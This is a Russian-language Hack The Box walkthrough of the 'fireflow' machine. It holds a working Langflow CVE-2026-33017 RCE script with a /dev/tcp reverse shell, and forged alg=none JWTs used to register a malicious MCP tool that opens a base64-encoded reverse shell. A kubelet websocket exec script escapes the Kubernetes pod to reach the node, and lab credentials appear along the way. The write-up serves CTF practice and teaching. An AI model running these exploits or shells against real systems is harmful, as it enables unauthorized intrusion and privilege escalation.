<div class="htb-box-info medium">
  <div class="box-header">
    <img src="https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/a217757a-39c0-4cac-9eb8-33f7ee9c9f9b-1782216388.png" alt="Machine Name">
    <div class="box-details">
      <h2>Box Info</h2>
      <table>
        <tr><td>OS:</td><td>Linux</td></tr>
        <tr><td>Difficulty:</td><td>Medium</td></tr>
        <tr><td>Release:</td><td>23 June 2026</td></tr>
      </table>
    </div>
  </div>
</div>

# Enumeration
#### nmap
```
nmap -sC -sV -vv <ip_target>

PORT      STATE    SERVICE  VERSION
22/tcp    open     ssh      OpenSSH 9.6p1 Ubuntu
443/tcp   open     ssl/http nginx
| ssl-cert: Subject: commonName=fireflow.htb
| Subject Alternative Name: DNS:fireflow.htb, DNS:*.fireflow.htb
9100/tcp  filtered jetdirect
30000/tcp filtered ndmps
31337/tcp filtered Elite
... [snipped]
OS: Linux 4.15 - 5.19
```

Добавим домен fireflow.htb в `/etc/hosts`.

#### port 443
![[Pasted image 20260708101520.png]]

Пройдя по сайту, я нашел поддомен flow.fireflow.htb. Также добавим его в `/etc/hosts`.

#### flow.fireflow.htb
На этом домене висит langflow. Мы имеем только flow_id. Остальной функционал не доступен.

![[Pasted image 20260708101851.png]]

# Initial access
#### CVE-2026-33017
Я прошелся по уязвимостям на langflow 1.8.2 и нашел CVE-2026-33017. 

> **CVE-2026-33017** is a **Remote Code Execution (RCE)** vulnerability in the Public flow build process of **Langflow**, an open-source platform for visually building LLM applications and AI workflows. By sending crafted flow data to the `build_public_tmp` endpoint without authentication, an attacker can cause **arbitrary Python code to be executed on the server**.

Я нашел такой вот [PoC](https://github.com/EQSTLab/CVE-2026-33017), чуть его изменил и получилось это:
```python
import argparse, sys, threading, uuid, socket, time, base64, requests

requests.packages.urllib3.disable_warnings()

def build_exploit_payload(command: str) -> dict:
    malicious_code = f"""\
from langflow.custom import Component
from langflow.io import Output
_r = __import__('os').system({repr(command)})
class ExploitComponent(Component):
    display_name = "ExploitComponent"
    outputs = [Output(display_name="Result", name="output", method="run")]
    def run(self) -> str: return "ok"
"""
    node_id = str(uuid.uuid4())
    return {
        "data": {
            "nodes": [
                {
                    "id": node_id,
                    "type": "genericNode",
                    "position": {"x": 0, "y": 0},
                    "data": {
                        "type": "CustomComponent",
                        "id": node_id,
                        "node": {
                            "template": {
                                "_type": "CustomComponent",
                                "code": {
                                    "value": malicious_code,
                                    "type": "code",
                                    "required": True,
                                    "show": True,
                                    "name": "code",
                                    "dynamic": False,
                                    "list": False,
                                    "multiline": True,
                                },
                            },
                            "description": "poc",
                            "display_name": "ExploitComponent",
                            "custom_fields": {},
                            "output_types": ["str"],
                            "base_classes": ["str"],
                            "outputs": [{"display_name": "Result", "name": "output", "method": "run", "selected": "str", "types": ["str"], "value": "__UNDEFINED__"}],
                        },
                    },
                }
            ],
            "edges": [],
            "viewport": {"x": 0, "y": 0, "zoom": 1},
        }
    }

def send_exploit(base_url, flow_id, command, client_id, timeout):
    payload = build_exploit_payload(command)
    endpoint = f"{base_url}/api/v1/build_public_tmp/{flow_id}/flow"
    print(1)
    try:
        resp = requests.post(
            endpoint, 
            json=payload, 
            cookies={"client_id": client_id}, 
            timeout=timeout,
            verify=False
        )
        return resp.status_code in (200, 201)
    except: return False

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", required=True)
    parser.add_argument("--flow-id", required=True)
    parser.add_argument("--lhost")
    parser.add_argument("--lport", type=int, default=4444)
    parser.add_argument("--timeout", type=int, default=15)
    parser.add_argument("--client-id", type=str, default="011f376d-09c0-4ec8-99ae-eca144afada6")
    args = parser.parse_args()

    shell_cmd = f"bash -i >& /dev/tcp/{args.lhost}/{args.lport} 0>&1"
    cmd = f"echo {base64.b64encode(shell_cmd.encode()).decode()} | base64 -d | bash"

    base_url = args.url.rstrip("/")
    
    if send_exploit(base_url, args.flow_id, cmd, args.client_id, args.timeout):
        print("[+] Exploit sent.")

    while True: time.sleep(1)

if __name__ == "__main__":
    main()

```

запускает netcat и через пару секунд получаем обратное соединение. По известной технике можно сделать ее интерактивной:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
> CTRL + Z
stty raw echo; fg
> ENTER + ENTER
export TERM = xterm
```
Спавнимся мы за www-data.

#### nightfall user
Недолго думая, я проверил переменные окружения командой `env` и нашел там:
```bash
LANGFLOW_SUPERUSER=langflow
LANGFLOW_SUPERUSER_PASSWORD=n1ghtm4r3_b4_n1ghtf4ll
LANGFLOW_SECRET_KEY=XgDCYma6JZzT3XXyePTbr4vgWrrZ4Vzz-PCQ4PXfKgE
LANGFLOW_AUTO_LOGIN=False
LANGFLOW_CONFIG_DIR=/var/lib/langflow
```

Перечисляя всех доступных юзеров из `/etc/passwd`, я нашел юзера nightfall. 
```bash
su nightfall
> enter passwd n1ghtm4r3_b4_n1ghtf4ll
```
Получаем первый флаг.

# Privilege escalation
В домашней директории я нашел скрытую папку .mcp. В ней лежал конфиг, содержащий:
```
{
  "server": "http://10.129.244.214:30080",
  "status_endpoint": "/api/v1/version",
  "user": "langflow-bot",
  "password": "Langfl0w@mcp2026!"
}
```
Получаем какой то эндпоинт...

Сделав запрос на него, я получил такой ответ:
```
{"service":"MCP AI Tool Registry", "version":"0.1.0",
"auth":{"type":"JWT","header":"Authorization: Bearer <token>","supported_algorithms":["HS256","none"]},
"docs":"/docs",
"endpoints":["
POST /mcp [MCP JSON-RPC 2.0]",
"POST /api/v1/auth",
"GET /api/v1/tools",
"POST /api/v1/tools [admin]"]}
```

Из этого ответа можно сделать 2 вывода:
1. для авторизации используется JWT токен, который может быть с шифрованием `none`.
2. для эндоинта `/api/v1/tools` нужны права админа.

#### JWT bypass
Так как в алгоритме токена поддерживается тип `none`, то мы можем просто удалить часть с сигнатурой, которая проверяет являемся мы тем кем себя заявляем на самом деле... 

для начала нужно получить токен:
```
curl -s http://<TARGET_IP>:30080/api/v1/auth \
  -H "Content-Type: application/json" \
  -d '{"username":"langflow-bot","password":"Langfl0w@mcp2026!"}' | jq
```

Получаем:
```
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoidXNlciJ9.RenGdHutrKPCOWjwYSJex8C_uMSmy7I8AMkhmTwf9Ps",
  "token_type": "bearer"
}
```

Открываем инструмент https://www.jwt.io/ и видим из чего состоит наш токен:
![[Pasted image 20260708105839.png]]

Просто изменим заголовок и основную часть на это:
![[Pasted image 20260708105942.png]]

Получаем токен админа: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.


#### mcp injection
Выводим список всех доступных инструментов:
```bash
curl http://10.129.244.214:30080/api/v1/tools

OUTPUT:
[{"name":"ping_host","description":"Ping a target host 3 times and return ICMP output."},

{"name":"get_metrics_summary","description":"Return a summary of system memory and load average from /proc."},

{"name":"list_running_tasks","description":"List the top 20 running processes sorted by CPU usage."}]
```

Попробуем создать тестовый инструмент:
```bash
curl -X POST http://10.129.244.214:30080/api/v1/tools -H "Content-Type: application/json" -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9." -d '{"name":"zov","description":"xz","code":"print(33)"}'
```

Пробуем запустить инструмент:
```bash
curl -X POST http://10.129.244.214:30080/mcp -H "Content-Type: application/json" -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9." -d '{"jsonrpc":"2.0","method":"tools/call","params":{"name":"zov"},"id":1}'
```
На терминал вывелось число - 33...

Теперь нужно получить шел. Создаем такой вот инструмент. Кодируем наш пэйлоад в base64, чтобы не возникало никаких оказий. Отправляем:
```bash
curl -X POST http://10.129.44.170:30080/api/v1/tools -H "Content-Type: application/json" -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9." -d '{"name":"rs3","description":"rs3","code":"import os;os.system(\"echo YmFzaCAtYyAnYmFzaCAgLWkgID4mICAvZGV2L3RjcC8xMC4xMC4xNC4xOTMvOTAwMSAwPiYxJwo= | base64 -d | bash\")"}'
```

Вызываем его:
 ```bash
 curl -X POST http://10.129.44.170:30080/mcp -H "Content-Type: application/json" -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9." -d '{"jsonrpc":"2.0","method":"tools/call","params":{"name":"rs3"},"id":1}'
 ```

> Создавать такой шелл было ошибкой надо было на сокетах писать...

#### kubernetes container spawn
Появился я как юзер mcp в контейнере kubernetes. Каждый pod kubernetes, работающий с учетной записью службы, получает токен по определенному пути. Мы получаем его и проверяем нашу среду:
```bash
mcp@mcp-server-54464cb475-29ztf:/app$ TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)

mcp@mcp-server-54464cb475-29ztf:/app$ env
KUBERNETES_SERVICE_HOST=10.43.0.1
KUBERNETES_PORT_443_TCP_PORT=443
KUBERNETES_PORT_443_TCP=tcp://10.43.0.1:443
```

Прежде чем пытаться выполнить какие-либо действия, мы используем `SelfSubjectRulesReview`, чтобы выяснить, какие действия разрешены для выполнения нашей служебной учетной записи:

```
curl -sk \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -X POST \
  https://10.43.0.1:443/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}'
```

OUTPUT:
```
{
    "kind": "SelfSubjectRulesReview",
    "apiVersion": "authorization.k8s.io/v1",
    "metadata": {},
    "spec": {},
    "status": {
        "resourceRules": [
            {
                "verbs": [
                    "get"
                ],
                "apiGroups": [
                    ""
                ],
                "resources": [
                    "nodes/proxy"
                ]
...SNIP
```

Ключевое разрешение: GET nodes/proxy. Это означает, что мы можем перенаправлять запросы через API сервер kubernetes к kubelet на узле — по сути, это сквозная передача данных через собственный API kubelet. Мы не можем перечислять узлы или создавать nodes/proxy, но мы можем выполнять get запросы через прокси сервер узла для чтения данных из kubelet.


Нужно найти имя узла. Перечислять мы не можем. Придется угадывать: первое что приходит на ум - название хоста.
```bash
curl -sk -H "Authorization: Bearer $TOKEN" https://10.43.0.1:443/api/v1/nodes/fireflow/proxy/pods 
```

OUTPUT:
```
"name": "prometheus-prometheus-node-exporter-nmntq",
"namespace": "monitoring",
"name": "coredns-76c974cb66-cn7l6",
"namespace": "kube-system",
"name": "mcp-server-54464cb475-29ztf",
"namespace": "default",
"name": "prometheus-server-867bb4fcfd-m4t59",
"namespace": "monitoring",
... [snipped]
```
имя узла `fireflow`. Из списка больше всего выделяется:
```
prometheus-prometheus-node-exporter-nmntq (namespace: monitoring)
```

При попытке запустить команду напрямую через api сервер, я получил ошибку 403
```bash
curl -sk -X POST -H "Authorization: Bearer $TOKEN" "https://10.43.0.1:443/api/v1/nodes/fireflow/proxy/run/monitoring/prometheus-prometheus-node-exporter-nmntq/node-exporter?cmd=id"
```

#### node escape
Суть здесь такова, что мы не можем выполнять какие-либо команды напрямую через API. Но мы можем выполнять команды через kubelet websocket... У него есть свой порт 10250. И для установления соединения с kubelet достаточно наших прав на get proxy/node... 

Я нашеш скрипт, который будет выполнять команды на kubelet через сокеты:
```
#!/usr/bin/env python3
import asyncio, ssl, sys, websockets
NODE = "10.129.44.170"
NE_NS = "monitoring"
NE_POD = "prometheus-prometheus-node-exporter-nmntq"
NE_CNT = "node-exporter"
TOKEN = open('/var/run/secrets/kubernetes.io/serviceaccount/token').read().strip()
COMMAND = sys.argv[1] if len(sys.argv) > 1 else 'id'

async def ws_exec(cmd_parts):
	ctx = ssl.create_default_context()
	ctx.check_hostname = False
	ctx.verify_mode = ssl.CERT_NONE
	args = "&".join(f"command={part}" for part in cmd_parts)
	url = (f"wss://{NODE}:10250/exec/{NE_NS}/{NE_POD}/{NE_CNT}"
	f"?output=1&error=1&{args}")
	async with websockets.connect(
	url, ssl=ctx,
	additional_headers={"Authorization": f"Bearer {TOKEN}"},
	subprotocols=["v4.channel.k8s.io"],
	open_timeout=10
	) as ws:
		try:
			while True:
				data = await asyncio.wait_for(ws.recv(), timeout=5)
				if isinstance(data, bytes) and len(data) > 1:
					sys.stdout.write(data[1:].decode("utf-8", errors="replace"))
					sys.stdout.flush()
		except (asyncio.TimeoutError, websockets.exceptions.ConnectionClosed):
			pass
asyncio.run(ws_exec(COMMAND.split()))
```
Сохраним его и запустим.

```bash
python3 evil.py "cat /host/root/root/root.txt"
[root flag]
```
Получили 2 флаг...


# Atack chain summary
1. Recon: обнаружен открытый порт 443, домен fireflow.htb и поддомен flow.fireflow.htb
2. Найдена уязвимость в Langflow 1.8.2 (CVE-2026-33017) → RCE, получена оболочка как www-data
3. В переменных окружения найден пароль пользователя nightfall
4. Обнаружен MCP-сервер (10.129.244.214:30080)
5. JWT уязвим к alg=none — подделан payload, получены admin-права на MCP
6. Через MCP получен доступ внутрь Kubernetes-кластера (pod mcp-server)
7. SelfSubjectRulesReview показал право get на nodes/proxy — прочитан список всех подов через kubelet proxy
8. Обнаружен node-exporter под мониторингом → цель для privesc
9. RBAC bypass: WebSocket-эндпоинт kubelet /exec/ не проверял create на pods/exec → произвольное выполнение кода в контейнере через nodes/proxy + get


